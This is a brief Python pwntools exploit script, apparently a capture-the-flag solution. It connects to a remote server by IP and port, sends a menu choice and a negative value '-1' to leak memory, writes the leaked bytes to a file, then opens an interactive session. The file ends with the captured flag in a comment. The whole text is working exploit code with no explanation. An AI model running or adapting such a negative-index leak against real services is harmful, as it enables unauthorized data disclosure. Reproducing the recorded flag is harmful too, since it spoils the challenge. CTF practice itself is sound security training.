from pwn import *
p = remote('35.242.239.180', 30625)
p.sendlineafter(':', '1')
p.sendlineafter(':', '-1')

data =p.recvuntil('Enter').replace('Enter', '').replace('\r\n', '\n')[4:-1]+'\x82'
with open('lucian_boss', 'w') as f:
    f.write(data)

p.interactive()
#ctf{1e894e796b65e40d46863907eafc9acd96c9591839a98b3d0c248d0aa23aab22}

